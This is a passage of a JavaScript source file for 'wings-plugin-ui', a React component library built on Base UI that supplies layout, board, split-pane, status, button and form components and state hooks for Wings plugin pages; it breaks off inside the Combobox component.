// wings-plugin-ui: a page says what to show and where, and Wings decides how it looks. Every component renders
// `w-*` class names and data attributes that Wings' plugin-ui.css styles, never a style of its own, so a Wings
// update restyles every plugin. The interactive ones are shadcn/ui's choice, Base UI's components, so a page behaves
// like Wings itself. Your own components and CSS work alongside them.
import { Button as BaseButton } from "@base-ui/react/button";
import { Checkbox as BaseCheckbox } from "@base-ui/react/checkbox";
import { Collapsible as BaseCollapsible } from "@base-ui/react/collapsible";
import { Combobox as BaseCombobox } from "@base-ui/react/combobox";
import { Field as BaseField } from "@base-ui/react/field";
import { Fieldset as BaseFieldset } from "@base-ui/react/fieldset";
import { Input as BaseInput } from "@base-ui/react/input";
import { Menu as BaseMenu } from "@base-ui/react/menu";
import { Select as BaseSelect } from "@base-ui/react/select";
import { Tabs as BaseTabs } from "@base-ui/react/tabs";
import { Toggle as BaseToggle } from "@base-ui/react/toggle";
import { ToggleGroup as BaseToggleGroup } from "@base-ui/react/toggle-group";
import { createContext, createElement as h, Fragment, useCallback, useContext, useEffect, useId, memo, useLayoutEffect, useRef, useState } from "react";
import { createRoot } from "react-dom/client";

import { MAX_DATA_IMAGE, emojify, parseBlocks, parseInline } from "./markdown.js";

export { MAX_DATA_IMAGE };

import { errorMessage } from "wings-plugin-sdk/async";
import { ago } from "wings-plugin-sdk/format";
import { pollWhileFocused } from "wings-plugin-sdk/poll";
import { mountShell } from "wings-plugin-sdk/shell";

// ---------- places ----------

let root = null;

function show(place, element, options) {
  const shell = mountShell(place, options);
  root ??= createRoot(shell);
  root.render(element);
}

/** Shows `element` as the page of a sidebar. One call per page; calling again renders the new element. */
export const showSidebar = (element, options) => show("sidebar", element, options);
/** Shows `element` as a view's page, in a modal or a window of its own. */
export const showView = (element, options) => show("view", element, options);
/** Shows `element` as a view's page in a tab next to the terminals. */
export const showTab = (element, options) => show("tab", element, options);
/** Shows `element` as a sidebar's popover. */
export const showPopover = (element, options) => show("popover", element, options);
/** Shows `element` as the plugin's page in Wings Settings. */
export const showSettings = (element, options) => show("settings", element, options);

let fit = null;

/**
 * Shows `element` as the page of a block on a Project page, like `showView`, and keeps the block as tall as the page:
 * each time the page's height changes it asks Wings for that height with `wings.setHeight`.
 */
export function showBlock(element) {
  show("view", element);
  // Mounting again gives the shell `show` mounted into, whose height is the page's, padding included.
  const shell = mountShell("view");
  fit ??= new ResizeObserver(() => wings.setHeight(Math.ceil(shell.getBoundingClientRect().height)));
  fit.observe(shell);
}

// ---------- the page's project, state and actions ----------

/** The project the page is about: undefined until Wings says, then the project, or null when none is open. */
export function useProject() {
  const [project, setProject] = useState(undefined);
  useEffect(() => wings.onProject(setProject), []);
  return project;
}

/**
 * Shows `children(project)` once Wings has said which project the page is about, keyed by the project's id, so a page
 * that holds state starts over for another project. Until then it shows `loading`. With no project it shows an `Empty`
 * titled "No project", unless `empty` says otherwise.
 */
export function ProjectGate({ loading, empty, children }) {
  const project = useProject();
  if (project === undefined) return h(Loading, null, loading);
  if (project === null) return h(Empty, { title: "No project", ...empty });
  return h(Fragment, { key: project.id }, children(project));
}

/** A saved value, read once: null until it is, then what `check` makes of it, or `initial` when nothing was saved or `check` says no. */
function useSaved(read, write, initial, check) {
  const [value, setValue] = useState(null);
  useEffect(() => {
    void read()
      .catch(() => null)
      .then((raw) => setValue((raw == null ? undefined : check(raw)) ?? initial));
    // Read once, when the component mounts.
  }, []);
  // A save that fails, like one that is too big, leaves the page with the value it set.
  return [
    value,
    (next) => {
      setValue(next);
      write(next).catch(() => {});
    },
  ];
}

/**
 * The state the tab saved with `wings.setTabState`, and a function that sets and saves it. The value is null until it's
 * read, then what `check` returns for the saved state, or `initial` when there is none or `check` returns null or undefined.
 */
export const useTabState = (initial, check) => useSaved(() => wings.tabState(), (state) => wings.setTabState(state), initial, check);
/** Like `useTabState`, for a block: the state saved with `wings.setBlockState`. */
export const useBlockState = (initial, check) => useSaved(() => wings.blockState(), (state) => wings.setBlockState(state), initial, check);

/**
 * What `wings.openView` opened this tab with, as `check` reads it, or null when there were no args or `check` returns
 * null or undefined for them. Read once: a tab opened with other args reloads.
 */
export function useViewArgs(check) {
  const [args] = useState(() => {
    const raw = wings.viewArgs();
    return raw == null ? null : (check(raw) ?? null);
  });
  return args;
}

/**
 * Runs the page's async actions and keeps what its buttons and error card show: `busy` while any `run` is going, and
 * the message of the last one that threw as `error`. Starting a `run` clears the error; `clear` does it by hand. `run`
 * says whether the action worked, so a caller that closes an editor or clears a draft can do it only then.
 */
export function useAction() {
  const [running, setRunning] = useState(0);
  const [error, setError] = useState(null);
  const run = useCallback(async (fn) => {
    setRunning((n) => n + 1);
    setError(null);
    try {
      await fn();
      return true;
    } catch (e) {
      setError(errorMessage(e));
      return false;
    } finally {
      setRunning((n) => n - 1);
    }
  }, []);
  const clear = useCallback(() => setError(null), []);
  return { run, busy: running > 0, error, clear };
}

/**
 * Calls `load` when the component mounts and each time `load` changes, if Wings is focused, then every `ms` while it is,
 * and once when Wings is focused again, so a block out of view asks for nothing. Wrap `load` in `useCallback` with what it reads, so it changes only when that does.
 */
export function usePoll(load, ms) {
  useEffect(() => pollWhileFocused(load, ms, { immediate: true }), [load, ms]);
}

/** Puts `text` on the clipboard. A sandboxed frame may refuse the clipboard API, so then it uses a hidden textarea. */
export async function copyText(text) {
  try {
    await navigator.clipboard.writeText(text);
  } catch {
    const box = document.createElement("textarea");
    box.value = text;
    document.body.append(box);
    box.select();
    document.execCommand("copy");
    box.remove();
  }
}

// ---------- helpers ----------

const cx = (base, extra) => (extra ? `${base} ${extra}` : base);
/** A data attribute that's there or not. */
const flag = (on) => (on ? "" : undefined);

// ---------- layout and text ----------

/** Children side by side, centred. `gap` is none, xs, s, m (default) or l. */
export function Row({ as = "div", gap, align, justify, wrap, grow, className, ...rest }) {
  return h(as, { ...rest, className: cx("w-row", className), "data-gap": gap, "data-align": align, "data-justify": justify, "data-wrap": flag(wrap), "data-grow": flag(grow) });
}

/** Children one under the other. */
export function Stack({ as = "div", gap, grow, className, ...rest }) {
  return h(as, { ...rest, className: cx("w-stack", className), "data-gap": gap, "data-grow": flag(grow) });
}

/** Text with a tone and size, that can grow to fill a row or truncate with an ellipsis. */
export function Text({ as = "span", tone, size, weight, mono, numeric, truncate, clamp, grow, className, ...rest }) {
  return h(as, {
    ...rest,
    className: cx("w-text", className),
    "data-tone": tone,
    "data-size": size,
    "data-weight": weight,
    "data-mono": flag(mono),
    "data-numeric": flag(numeric),
    "data-truncate": flag(truncate),
    "data-clamp": flag(clamp),
    "data-grow": flag(grow),
  });
}

/** A page's or a card's title: an `h1` unless `as` says otherwise. `size` large for a bigger one. `truncate` for one line. */
export function Title({ as = "h1", size, truncate, className, ...rest }) {
  return h(as, { ...rest, className: cx("w-title", className), "data-size": size, "data-truncate": flag(truncate) });
}

/** A small section heading, `h2` unless `level` says 3 or 4, with `actions` like chips or a button on its right. */
export function Heading({ level = 2, actions, className, ...rest }) {
  const heading = h(`h${level}`, { ...rest, className: cx("w-heading", className) });
  return actions ? h("div", { className: "w-heading-row" }, heading, actions) : heading;
}

/** A card. `compact` for a summary line. */
export function Card({ as = "div", compact, className, ...rest }) {
  return h(as, { ...rest, className: cx("w-card", className), "data-size": compact ? "compact" : undefined });
}

// ---------- pages ----------

/**
 * A page that fills a tab: a `toolbar` (usually a `Toolbar`) over a body that scrolls. `flush` takes the body's padding
 * and scrolling away, for a body that lays itself out, like a `ListDetail`, a `Split` or a `Board`. Show it with
 * `showTab(<Page />, { fill: true })`.
 */
export function Page({ toolbar, flush, children, className, ...rest }) {
  return h("div", { ...rest, className: cx("w-page", className) }, toolbar, h("div", { className: "w-page-body", "data-flush": flag(flush) }, children));
}

/** A page's top row: a `title` on the left, `children` like filters or a search box after it, and `actions` on the right. */
export function Toolbar({ title, actions, children, className, ...rest }) {
  return h(
    "header",
    { ...rest, className: cx("w-toolbar", className) },
    title === undefined ? null : h(Title, { truncate: true, className: "w-toolbar-title" }, title),
    h("div", { className: "w-toolbar-main" }, children),
    actions ? h("div", { className: "w-toolbar-actions" }, actions) : null,
  );
}

/**
 * A `list` pane and a `detail` pane side by side. Without a `detail` the detail pane shows `empty`. Narrower than the
 * page can fit both, it shows one: the list, or the detail once there is one, with a back button if `onBack` is given.
 * `listWidth` is the list's width in px.
 */
export function ListDetail({ list, detail, empty = h(Empty, { title: "Nothing selected" }), listWidth = 280, listLabel, detailLabel, onBack, backLabel = "Back", className, style, ...rest }) {
  const has = detail !== undefined && detail !== null && detail !== false;
  return h(
    "div",
    // The width is data, not a style: plugin-ui.css sizes the list from it.
    { ...rest, className: cx("w-list-detail", className), style: { ...style, "--w-list-width": `${listWidth}px` }, "data-has-detail": flag(has) },
    h("section", { className: "w-list-detail-list", "aria-label": listLabel }, list),
    h(
      "section",
      { className: "w-list-detail-detail", "aria-label": detailLabel },
      has && onBack ? h(Button, { variant: "ghost", size: "sm", className: "w-list-detail-back", onClick: onBack }, backLabel) : null,
      h("div", { className: "w-list-detail-body" }, has ? detail : empty),
    ),
  );
}

/** Columns side by side that scroll sideways, each a `BoardColumn`. `label` names the scrolling region. */
export function Board({ label, className, ...rest }) {
  // A scrolling region has to take focus, or a keyboard can't scroll it.
  return h("div", { tabIndex: 0, ...rest, role: "region", "aria-label": label, className: cx("w-board", className) });
}

/** A column of a `Board`: a `title` with the `count` of cards and `actions`, over `children`, usually `Card`s, that scroll. */
export function BoardColumn({ title, count, actions, children, className, ...rest }) {
  const id = useId();
  return h(
    "section",
    { ...rest, className: cx("w-board-column", className), "aria-labelledby": id },
    h(
      "header",
      { className: "w-board-column-header" },
      h("h2", { id, className: "w-board-column-title" }, title),
      count === undefined ? null : h(Badge, { variant: "secondary", className: "w-board-column-count" }, count),
      actions ? h("div", { className: "w-board-column-actions" }, actions) : null,
    ),
    h("div", { className: "w-board-column-body" }, children),
  );
}

/** A board in rows: `columns` head it once, each child is a `BoardLane`. The lanes scroll down, the whole board sideways. */
export function BoardLanes({ label, columns, children, className, style, ...rest }) {
  return h(
    "div",
    { ...rest, className: cx("w-board-lanes", className), style: { ...style, "--w-board-columns": columns.length } },
    h(
      "div",
      { className: "w-board-lanes-head" },
      columns.map((c) =>
        h(
          "div",
          { key: c.id, className: "w-board-lanes-column" },
          h("span", { className: "w-board-lanes-column-title" }, c.title),
          c.count === undefined ? null : h(Badge, { variant: "secondary", className: "w-board-column-count" }, c.count),
        ),
      ),
    ),
    // The lanes are what scrolls down, so they are the region that takes focus for the arrow keys.
    h("div", { tabIndex: 0, role: "region", "aria-label": label, className: "w-board-lanes-body" }, children),
  );
}

/** A row of `BoardLanes`: a header that folds it, with its title, count and actions, over one `BoardCell` per column. */
export function BoardLane({ label, title, count, actions, open, defaultOpen = true, onOpenChange, children, className, ...rest }) {
  const id = useId();
  const [own, setOwn] = useState(defaultOpen);
  const shown = open ?? own;
  const toggle = () => {
    if (open === undefined) setOwn(!shown);
    onOpenChange?.(!shown);
  };
  return h(
    "section",
    { ...rest, className: cx("w-board-lane", className), "aria-labelledby": `${id}t`, "data-open": flag(shown) },
    h(
      "header",
      { className: "w-board-lane-header" },
      h(
        "div",
        { className: "w-board-lane-lead" },
        h(Button, { variant: "ghost", size: "icon-xs", className: "w-board-lane-toggle", "aria-label": label, "aria-expanded": shown, "aria-controls": `${id}b`, onClick: toggle }, icon("chevron-down")),
        h("h2", { id: `${id}t`, className: "w-board-lane-title" }, title ?? label),
        count === undefined ? null : h(Badge, { variant: "secondary", className: "w-board-column-count" }, count),
        actions ? h("div", { className: "w-board-lane-actions" }, actions) : null,
      ),
    ),
    h("div", { id: `${id}b`, className: "w-board-lane-body", hidden: !shown }, children),
  );
}

/** A lane's cell under one column: a stack of cards, named `label` for a screen reader. */
export function BoardCell({ label, className, ...rest }) {
  return h("div", { role: "group", "aria-label": label, ...rest, className: cx("w-board-cell", className) });
}

const SPLIT_STEP = 16;
const SPLIT_STEP_LARGE = 64;
const SPLIT_HANDLE = 9;

/**
 * Two panes, `start` and `end`, with a handle between them. Drag it or use the arrow keys, Home and End. While you drag
 * only a CSS variable changes, so nothing renders per frame; `onResize` gets the start pane's size in px once, when
 * the drag or the key press ends. `direction` horizontal puts the panes side by side, vertical one over the other.
 */
export function Split({ start, end, direction = "horizontal", defaultSize = 280, min = 120, max, onResize, label = "Resize panes", className, style, ...rest }) {
  const id = useId();
  const box = useRef(null);
  const handle = useRef(null);
  const drag = useRef(null);
  const [size, setSize] = useState(defaultSize);
  const vertical = direction === "vertical";

  // The start pane can't be smaller than `min`, bigger than `max`, or leave the end pane less than `min`.
  const limits = () => {
    const rect = box.current?.getBoundingClientRect();
    const total = rect ? (vertical ? rect.height : rect.width) : 0;
    const room = total > 0 ? total - SPLIT_HANDLE - min : Infinity;
    return [min, Math.max(min, Math.min(max ?? Infinity, room))];
  };
  const clamp = (value) => {
    const [low, high] = limits();
    return Math.round(Math.min(high, Math.max(low, value)));
  };
  const syncMax = () => {
    const [, high] = limits();
    if (Number.isFinite(high)) handle.current?.setAttribute("aria-valuemax", String(Math.round(high)));
  };
  // Dragging writes the DOM, not state: a render per pointer move would re-render the whole page.
  const preview = (next) => {
    box.current.style.setProperty("--w-split-size", `${next}px`);
    handle.current.setAttribute("aria-valuenow", String(next));
  };
  const commit = (next) => {
    setSize(next);
    if (next !== size) onResize?.(next);
  };
  const endDrag = (e, keep) => {
    if (!drag.current) return;
    const { value } = drag.current;
    drag.current = null;
    handle.current.removeAttribute("data-dragging");
    box.current.removeAttribute("data-dragging");
    if (e.currentTarget.hasPointerCapture?.(e.pointerId)) e.currentTarget.releasePointerCapture(e.pointerId);
    if (keep) commit(value);
    else preview(size);
  };
  useLayoutEffect(syncMax);

  const onPointerDown = (e) => {
    if (e.button !== 0) return;
    e.preventDefault();
    e.currentTarget.setPointerCapture?.(e.pointerId);
    syncMax();
    drag.current = { from: vertical ? e.clientY : e.clientX, size, value: size };
    handle.current.setAttribute("data-dragging", "");
    box.current.setAttribute("data-dragging", "");
  };
  const onPointerMove = (e) => {
    const d = drag.current;
    if (!d) return;
    d.value = clamp(d.size + (vertical ? e.clientY : e.clientX) - d.from);
    preview(d.value);
  };
  const onKeyDown = (e) => {
    const step = e.shiftKey ? SPLIT_STEP_LARGE : SPLIT_STEP;
    const [low, high] = limits();
    const [less, more] = vertical ? ["ArrowUp", "ArrowDown"] : ["ArrowLeft", "ArrowRight"];
    const next = e.key === less ? size - step : e.key === more ? size + step : e.key === "Home" ? low : e.key === "End" ? high : null;
    if (next === null || !Number.isFinite(next)) return;
    e.preventDefault();
    commit(clamp(next));
  };

  return h(
    "div",
    // The size is data, not a style: plugin-ui.css sizes the start pane from it.
    { ...rest, ref: box, className: cx("w-split", className), style: { ...style, "--w-split-size": `${size}px` }, "data-direction": direction },
    h("div", { id, className: "w-split-pane" }, start),
    h("div", {
      ref: handle,
      className: "w-split-handle",
      role: "separator",
      tabIndex: 0,
      "aria-label": label,
      "aria-orientation": vertical ? "horizontal" : "vertical",
      "aria-controls": id,
      "aria-valuemin": min,
      "aria-valuemax": max,
      "aria-valuenow": size,
      onPointerDown,
      onPointerMove,
      onPointerUp: (e) => endDrag(e, true),
      onPointerCancel: (e) => endDrag(e, false),
      onKeyDown,
    }),
    h("div", { className: "w-split-pane" }, end),
  );
}

// ---------- figures ----------

const levelTone = (percent, levels) => (!levels ? undefined : percent >= levels[1] ? "danger" : percent >= levels[0] ? "warn" : undefined);

/** A bar from 0 to 100. `tone` is warn or danger. */
export function Meter({ percent, label, tone, className, ...rest }) {
  return h(
    "div",
    { ...rest, className: cx("w-meter", className), role: "meter", "aria-label": label, "aria-valuemin": 0, "aria-valuemax": 100, "aria-valuenow": percent, "data-tone": tone },
    // How full it is is data, not a style: plugin-ui.css sizes the bar from it.
    h("span", { className: "w-meter-fill", style: { "--w-value": `${Math.max(0, Math.min(100, percent))}%` } }),
  );
}

/** A labelled bar with its percentage and a note under it. `levels` are where it turns warn and danger. */
export function Gauge({ label, percent, note, tone, levels, className, ...rest }) {
  return h(
    "div",
    { ...rest, className: cx("w-gauge", className) },
    h("span", { className: "w-gauge-label" }, label),
    h("span", { className: "w-gauge-value" }, `${percent}%`),
    h(Meter, { percent, label, tone: tone ?? levelTone(percent, levels) }),
    note ? h("span", { className: "w-gauge-note" }, note) : null,
  );
}

/** Small figures side by side, label over value. */
export function Stats({ items, className, ...rest }) {
  return h(
    "dl",
    { ...rest, className: cx("w-stats", className) },
    items.map((item) => h("div", { key: item.label }, h("dt", { className: "w-stat-label" }, item.label), h("dd", { className: "w-stat-value", "data-tone": item.tone, title: item.title }, item.value))),
  );
}

/** Label and value pairs, one per line. */
export function Properties({ items, className, ...rest }) {
  return h(
    "dl",
    { ...rest, className: cx("w-props", className) },
    items.map((item) => h("div", { key: item.label, className: "w-prop" }, h("dt", { className: "w-prop-label" }, item.label), h("dd", { className: "w-prop-value" }, item.value))),
  );
}

// ---------- lists ----------

/** A list of rows. `ordered` for an `ol`, `compact` for rows with no space between them. */
export function List({ ordered, compact, className, ...rest }) {
  return h(ordered ? "ol" : "ul", { ...rest, className: cx("w-list", className), "data-density": compact ? "compact" : undefined });
}

/** A row in a `List`. Holding a `ListButton`, the button is the row. */
export function ListItem({ align, className, ...rest }) {
  return h("li", { ...rest, className: cx("w-list-item", className), "data-align": align });
}

/** A row that's a button, inside a `ListItem`. */
export function ListButton({ align, type = "button", className, ...rest }) {
  return h("button", { ...rest, type, className: cx("w-list-button", className), "data-align": align });
}


// ---------- status ----------

/**
 * A status dot. With a `label` it's announced; otherwise it's decoration next to text that says the same.
 * `color` is a colour from your data, like a work item type's; otherwise `tone` colours it.
 */
export function Dot({ tone, color, label, className, style, ...rest }) {
  return h("span", {
    ...rest,
    className: cx("w-dot", className),
    // A colour that comes with the data, not a style: plugin-ui.css paints the dot with it, over any tone.
    style: color ? { ...style, "--w-color": color } : style,
    "data-color": color ? "" : undefined,
    "data-tone": color ? undefined : tone,
    ...(label ? { role: "img", "aria-label": label } : { "aria-hidden": true }),
  });
}

/** Up to two initials of a name or login: "Ada Lovelace" is AL, "ada-bot[bot]" is AB, "ada" is A. */
const initialsOf = (name) => {
  const words = name.replace(/\[bot\]$/i, "").split(/[^\p{L}\p{N}]+/u).filter(Boolean);
  return (words.length > 1 ? words[0][0] + words[1][0] : (words[0] ?? "?").slice(0, 1)).toUpperCase();
};

/** A hue from 0 to 359 that depends only on the name, so a person has the same colour everywhere. */
const hueOf = (name) => {
  let hash = 0;
  for (let i = 0; i < name.length; i++) hash = (hash * 31 + name.charCodeAt(i)) >>> 0;
  return hash % 360;
};

/**
 * A round avatar with the initials of a `name` on a colour taken from it. Decoration next to the name by default;
 * with a `label` it's announced.
 */
export function Avatar({ name, size, label, className, style, ...rest }) {
  return h(
    "span",
    {
      ...rest,
      className: cx("w-avatar", className),
      // The hue comes from the name, as data: plugin-ui.css paints the avatar with it.
      style: { ...style, "--w-hue": hueOf(name) },
      "data-size": size,
      ...(label ? { role: "img", "aria-label": label } : { "aria-hidden": true }),
    },
    initialsOf(name),
  );
}

/** A spinner. With a `label` it's announced. */
export function Spinner({ size, label, className, ...rest }) {
  return h("span", { ...rest, className: cx("w-spinner", className), "data-size": size, ...(label ? { role: "img", "aria-label": label } : { "aria-hidden": true }) });
}

/**
 * A badge: `variant` is default, secondary, destructive, outline, ghost or link, like shadcn/ui's. `tone` is Wings'
 * own addition, a colour that says something.
 */
export function Badge({ variant = "default", tone, className, ...rest }) {
  return h("span", { ...rest, className: cx("w-badge", className), "data-variant": variant, "data-tone": tone });
}

/** What shows before the first data comes. */
export function Loading({ children = "Loading…", className, ...rest }) {
  return h("p", { ...rest, className: cx("w-loading", className) }, children);
}

/** Nothing to show: a `title`, a `description` on what to do about it, and `children`, like a button, under them. */
export function Empty({ title, description, children, className, ...rest }) {
  return h(
    "div",
    { ...rest, className: cx("w-empty", className) },
    h("div", { className: "w-empty-header" }, h("p", { className: "w-empty-title" }, title), description === undefined ? null : h("p", { className: "w-empty-description" }, description)),
    children,
  );
}

// ---------- buttons ----------

/**
 * A button on Base UI's Button. `variant` is default (filled), secondary, outline, ghost, destructive or link; `size`
 * default, xs, sm, lg, icon, icon-xs, icon-sm or icon-lg, like shadcn/ui's. `busy` shows a spinner and ignores clicks while the
 * button keeps the keyboard focus.
 */
export function Button({ variant = "default", size = "default", busy, disabled, type = "button", children, className, ...rest }) {
  return h(
    BaseButton,
    {
      ...rest,
      type,
      className: cx("w-button", className),
      "data-variant": variant,
      "data-size": size,
      // Busy, not disabled: a disabled button would drop the keyboard focus on the page. Base UI's disabled button that
      // stays focusable is aria-disabled and ignores clicks.
      disabled: busy || disabled,
      focusableWhenDisabled: busy,
      "aria-busy": busy || undefined,
    },
    busy ? h(Spinner) : null,
    children,
  );
}

/** A small quiet button. With `pressed` it's a toggle. */
export function Chip({ pressed, type = "button", className, ...rest }) {
  return pressed === undefined
    ? h(BaseButton, { ...rest, type, className: cx("w-chip", className) })
    : h(BaseToggle, { ...rest, type, pressed, className: cx("w-chip", className) });
}

/** Chips that pick one of `options`, like a filter. `onChange` gets each click, the chip that's on too. */
export function Chips({ label, options, value, onChange, className, ...rest }) {
  return h(
    BaseToggleGroup,
    {
      ...rest,
      className: cx("w-chips", className),
      "aria-label": label,
      value: [value],
      // A group of one: pressing the chip that's on turns it off, which is the click on `value` again.
      onValueChange: (next) => onChange(next[0] ?? value),
    },
    options.map(({ value: v, label: text, ...chip }) => h(BaseToggle, { ...chip, key: v, value: v, className: "w-chip" }, text)),
  );
}

/**
 * Tabs over the panel they show, `children`, on Base UI's Tabs. Arrow keys, Home and End move between tabs and
 * show the tab they land on. `variant` is default (a pill) or line (an underline), like shadcn/ui's.
 */
export function Tabs({ label, items, value, onChange, variant = "default", children, className, ...rest }) {
  return h(
    BaseTabs.Root,
    { ...rest, className: cx("w-tabs-root", className), value, onValueChange: onChange },
    h(
      BaseTabs.List,
      { className: "w-tabs", "aria-label": label, "data-variant": variant, activateOnFocus: true },
      items.map((t) => h(BaseTabs.Tab, { key: t.value, value: t.value, className: "w-tab", title: t.title }, t.label)),
    ),
    h(BaseTabs.Panel, { value, className: "w-tab-panel" }, children),
  );
}

// ---------- fields ----------

// Lucide's paths (ISC licence), as the app's own components draw them: the icons the components use, and the ones
// plugins pasted into their pages.
const ICONS = {
  check: "M20 6 9 17l-5-5",
  "chevron-down": "m6 9 6 6 6-6",
  trash: "M10 11v6M14 11v6M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6M3 6h18M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2",
};

/** One of Lucide's icons, in the colour of the text around it. Decoration, unless it has a `label`. */
export function Icon({ name, label, className, ...rest }) {
  return h(
    "svg",
    { ...rest, className: cx("w-icon", className), viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: 2, strokeLinecap: "round", strokeLinejoin: "round", ...(label ? { role: "img", "aria-label": label } : { "aria-hidden": true }) },
    h("path", { d: ICONS[name] }),
  );
}
const icon = (name, className) => h(Icon, { name, className });

const FieldIdContext = createContext(undefined);
const GroupContext = createContext(null);

/** A hint or an error under a group. */
const fieldNote = (id, hint, error) => (error ?? hint ? h("p", { id, className: "w-field-hint", "data-tone": error ? "danger" : undefined }, error ?? hint) : null);

/**
 * A labelled field with a `hint` or an `error` under it, for the input in `children`, on Base UI's Field: the label,
 * the hint and the invalid state reach the input by themselves. `id` is the input's id, for a page that puts focus
 * back by id; `inline` puts the label and the input on one line.
 */
export function Field({ id: given, label, hint, error, inline, children, className, ...rest }) {
  const generated = useId();
  // The label is tied to the input by Base UI: the input registers its id, the one you gave or one it makes.
  const labelled = h(BaseField.Label, { className: "w-field-label" }, label);
  const control = h(FieldIdContext.Provider, { value: given }, children);
  const hintId = `${given ?? generated}-hint`;
  return h(
    BaseField.Root,
    { ...rest, className: cx("w-field", className), invalid: Boolean(error), "data-layout": inline ? "inline" : undefined },
    inline ? h("div", { className: "w-field-row" }, labelled, control) : labelled,
    inline ? null : control,
    error ? h(BaseField.Error, { id: hintId, match: true, className: "w-field-hint", "data-tone": "danger" }, error) : hint ? h(BaseField.Description, { id: hintId, className: "w-field-hint" }, hint) : null,
  );
}

/** Several controls under one label, like a list of checkboxes, with a `hint` or an `error` under them. */
export function FieldGroup({ label, hint, error, children, className, ...rest }) {
  const id = useId();
  const hintId = error ?? hint ? `${id}-hint` : undefined;
  return h(
    BaseFieldset.Root,
    { ...rest, className: cx("w-field-group", className), "aria-describedby": hintId },
    h(BaseFieldset.Legend, { className: "w-field-label" }, label),
    h(GroupContext.Provider, { value: { invalid: Boolean(error) } }, children),
    fieldNote(hintId, hint, error),
  );
}

/** The id a `Field` gives its input, unless the input has its own. */
function useFieldId(id) {
  const field = useContext(FieldIdContext);
  return id ?? field;
}

/** A text input. Outside a `Field`, give it a `label`. */
export function TextInput({ label, type = "text", id, className, ...rest }) {
  return h(BaseInput, { "aria-label": label, ...rest, id: useFieldId(id), type, className: cx("w-input", className) });
}

/** A multi-line text input. Outside a `Field`, give it a `label`. */
export function Textarea({ label, id, className, ...rest }) {
  // Base UI's input drawn as a textarea, so that it joins a Field the way TextInput does.
  return h(BaseInput, { "aria-label": label, ...rest, id: useFieldId(id), render: h("textarea"), className: cx("w-input w-textarea", className) });
}

/** A search box. `label` names it for screen readers. */
export function SearchField({ label, id, className, ...rest }) {
  return h(BaseInput, { "aria-label": label, ...rest, id: useFieldId(id), type: "search", className: cx("w-input w-search", className) });
}

/** A select of `options` on Base UI's Select, its list a popup in the page. `onChange` gets the value picked. */
export function Select({ label, options, value, defaultValue, onChange, disabled, name, required, form, id, className, ...rest }) {
  return h(
    BaseSelect.Root,
    {
      items: options,
      // Like a native select, one without a `value` starts on its first option.
      ...(value === undefined ? { defaultValue: defaultValue ?? options[0]?.value ?? null } : { value }),
      onValueChange: (next, details) => {
        // Base UI clears a pick whose option left the list, but checks against the value from before the render, so
        // a page that picks and drops an option (a "Choose…" row) at once would get null for a value still listed.
        if (next === null && details.reason === "none" && options.some((o) => o.value === value)) return;
        onChange?.(next);
      },
      disabled,
      name,
      required,
      form,
    },
    h(
      BaseSelect.Trigger,
      { "aria-label": label, ...rest, id: useFieldId(id), className: cx("w-select", className) },
      h(BaseSelect.Value, { className: "w-select-value" }),
      h(BaseSelect.Icon, { render: icon("chevron-down", "w-select-icon") }),
    ),
    h(
      BaseSelect.Portal,
      null,
      h(
        BaseSelect.Positioner,
        { className: "w-positioner", sideOffset: 4 },
        h(
          BaseSelect.Popup,
          { className: "w-popup w-select-popup" },
          h(
            BaseSelect.List,
            null,
            options.map((o) =>
              h(BaseSelect.Item, { key: o.value, value: o.value, label: o.label, disabled: o.disabled, className: "w-select-item" }, h(BaseSelect.ItemText, null, o.label), h(BaseSelect.ItemIndicator, { className: "w-item-check", render: h("span") }, icon("check"))),
            ),
          ),
        ),
      ),
    ),
  );
}

/** A checkbox with its label, `children`, on Base UI's Checkbox. `onChange` gets whether it's checked. */
export function Checkbox({ onChange, children, className, id, ...rest }) {
  // In a FieldGroup with an error, each box says so: a group can't be marked invalid itself.
  const group = useContext(GroupContext);
  return h(
    "label",
    { className: cx("w-check", className) },
    // A button, so `id` is the one you can focus: on Base UI's default span it names the hidden input.
    h(BaseCheckbox.Root, { "aria-invalid": group?.invalid || undefined, ...rest, id: useFieldId(id), nativeButton: true, render: h("button", { type: "button" }), onCheckedChange: onChange && ((checked) => onChange(checked)), className: "w-checkbox" }, h(BaseCheckbox.Indicator, { className: "w-checkbox-indicator", render: h("span") }, icon("check"))),
    children,
  );
}

const contains = (option, query) => {
  const q = query.trim().toLowerCase();
  return !q || option.label.toLowerCase().includes(q) || Boolean(option.detail?.toLowerCase().includes(q));
};

/**
 * A text field with `options` under it, on Base UI's Combobox. Arrows move, Enter picks, Escape and Tab close. With
 * `freeText` the field keeps what you type (`value`, `onInput`) and starts with nothing highlighted; otherwise you
 * type to find an option, the field shows `value` once you've picked, and the list starts on the first option.
 * `open="whileText"` keeps the list shown while the field has text and something matches, which Escape, Tab and a
 * press outside don't close: they only drop the highlight.
 */
export function Combobox({ label, value, onInput, options, onPick, onEnter, onKeyDown: onKeyDownProp, freeText = false, openOnFocus = true, open: openMode = "auto", filter = contains, empty = "No matches.", className, id: given, ...rest }) {
  const id = useFieldId(given);
  const [opened, setOpened] = useState(false);
  const [query, setQuery] = useState("");
  // Whether the list shuts for a moment to let go of its highlight, see `dismiss`.
  const [letGo, setLetGo] = useState(false);
  const input = useRef(null);
  const highlighted = useRef(false);
  const text = freeText ? value : query;
  // "whileText": the list is open exactly while there is text and something matches it, whatever has focus.
  const whileText = openMode === "whileText";
  const open = whileText ? text !== "" : opened;
  const shown = open ? options.filter((o) => filter(o, text)) : [];
  const visible = whileText ? shown.length > 0 : open;

  const close = () => {
    setOpened(false);
    setQuery("");
  };
  // Base UI keeps its highlight until the list closes, and offers no other way to drop it. A list that stays shown
  // closes and opens again within one render, with no exit animation in between, which is how it lets go.
  const dismiss = () => whileText && setLetGo(true);
  useLayoutEffect(() => {
    if (letGo) setLetGo(false);
  }, [letGo]);
  // A picker shows what was picked while it's closed, so select that text: typing replaces it, as it does in a
  // native select-and-type field, instead of landing after it. MUI's Autocomplete does the same (`selectOnFocus`).
  useLayoutEffect(() => {
    if (!freeText && !open && document.activeElement === input.current) input.current.select();
  }, [freeText, open, value]);

  const onKeyDown = (e) => {
    onKeyDownProp?.(e);
    // The consumer's key, handled: Base UI's own handlers for it don't run.
    if (e.defaultPrevented) return e.preventBaseUIHandler();
    if (e.key === "Enter" && !highlighted.current && onEnter) {
      // Nothing highlighted: the text is the answer, and Enter doesn't submit a form around it.
      e.preventDefault();
